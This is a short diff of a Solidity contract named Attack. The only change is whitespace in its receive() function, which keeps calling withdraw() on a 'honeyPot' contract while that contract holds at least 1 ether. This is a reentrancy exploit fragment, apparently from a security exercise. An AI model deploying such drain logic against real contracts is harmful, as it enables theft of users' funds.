@@ -19,7 +19,7 @@ contract Attack {
         honeyPot.deposit{value: 1 ether}();
     }
 
-    receive() external payable  {
+    receive() external payable {
         if (address(honeyPot).balance >= 1 ether) {
             honeyPot.withdraw();
         }
